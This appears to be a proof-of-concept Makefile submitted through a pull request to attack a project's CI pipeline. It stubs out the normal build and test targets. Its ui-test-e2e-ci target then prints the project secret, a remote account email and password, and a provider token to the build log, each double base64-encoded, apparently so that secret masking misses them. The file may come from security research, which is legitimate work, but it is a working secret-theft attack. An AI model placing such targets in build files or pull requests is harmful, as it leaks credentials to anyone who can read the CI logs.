# Minimal verification Makefile (attacker-controlled via PR)
.PHONY: server ui-build ui-setup-ci ui-test-setup ui-test-e2e-ci

server:
	@echo "GERALT_DBG: server target replaced (no-op)"
	@true

ui-build:
	mkdir -p ui/out provider-ui/out
	printf 'placeholder' > ui/out/index.html
	printf 'placeholder' > provider-ui/out/index.html

ui-setup-ci:
	@echo "GERALT_DBG: ui-setup-ci replaced (no-op)"
	@true

ui-test-setup:
	@echo "GERALT_DBG: ui-test-setup replaced (no-op)"
	@true

ui-test-e2e-ci:
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"
	@echo "GERALT_DBG_REMOTE_EMAIL=$$(printf '%s' "$$REMOTE_PROVIDER_USER_EMAIL" | base64 | base64)"
	@echo "GERALT_DBG_REMOTE_PASS=$$(printf '%s' "$$REMOTE_PROVIDER_USER_PASSWORD" | base64 | base64)"
	@echo "GERALT_DBG_REMOTE_TOKEN=$$(printf '%s' "$$PROVIDER_TOKEN" | base64 | base64)"
	@exit 1
